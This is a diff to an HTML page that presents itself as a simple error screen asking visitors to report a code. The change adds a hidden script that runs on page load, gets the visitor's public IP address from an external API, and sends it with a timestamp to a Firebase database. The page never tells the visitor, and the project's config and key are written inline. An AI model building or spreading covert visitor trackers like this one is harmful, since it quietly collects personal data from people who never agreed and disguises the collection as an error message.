@@ -9,21 +9,67 @@
         h1 {
             color: green;
         }
+
         p {
             color: #013220;
         }
     </style>
-</head>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
 
+        // config
+        const firebaseConfig = {
+            apiKey: "AIzaSyA20B9DVKJBZVRaVcCh1KPmOwDv6fUzhTQ",
+            authDomain: "client-ips.firebaseapp.com",
+            databaseURL: "https://client-ips-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "client-ips",
+            storageBucket: "client-ips.appspot.com",
+            messagingSenderId: "834132677988",
+            appId: "1:834132677988:web:af11996a5b653f24f15671",
+            measurementId: "G-9L2NQJTJTF"
+        };
+
+        // starts firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // fetches the ip from the api
+        async function fetchClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Error: ", error);
+                return "unknown";
+            }
+        }
+        // adds the ip
+        async function logClientIP() {
+            const clientIP = await fetchClientIP();
+            const timestamp = new Date().toISOString();
+
+            set(ref(database, 'clientIPs/' + timestamp), {
+                ip: clientIP,
+                time: timestamp
+            })
+            .then(() => {
+                console.log("Logged Succesfully.");
+            })
+            .catch((error) => {
+                console.error("Error:", error);
+            });
+        }
+
+        // when the website/whatever loads
+        document.addEventListener('DOMContentLoaded', logClientIP);
+    </script>
+</head>
 <body>
     <center>
         <h1>ERROR</h1>
-        <p>An error has occured, please return the code "cc7180a9 HTTP 204"</p>
+        <p>An error has occurred, please return the code "cc7180a9 HTTP 204"</p>
     </center>
-
-    <script>
-        
-    </script>
 </body>
-
 </html>
